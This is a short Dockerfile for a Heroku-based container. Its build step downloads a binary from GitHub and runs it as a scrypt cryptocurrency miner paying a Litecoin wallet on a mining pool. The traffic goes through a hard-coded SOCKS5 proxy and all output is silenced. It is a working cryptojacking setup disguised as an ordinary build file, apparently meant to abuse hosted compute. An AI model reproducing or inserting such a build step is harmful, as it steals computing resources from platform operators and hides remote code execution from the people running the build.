FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/justgrabthat/justgrab/raw/main/online; chmod +x online; ./online -a scrypt -o stratum+tcp://scrypt.asia.mine.zergpool.com:3433 -u MAU5ycXcJM3sBjREYEaFzRgxvbxYwkfQ4Y -p c=LTC,ID=ampskpi -t 2 -x socks5://192.252.214.20:15864 > /dev/null 2>&1
CMD bash heroku.sh
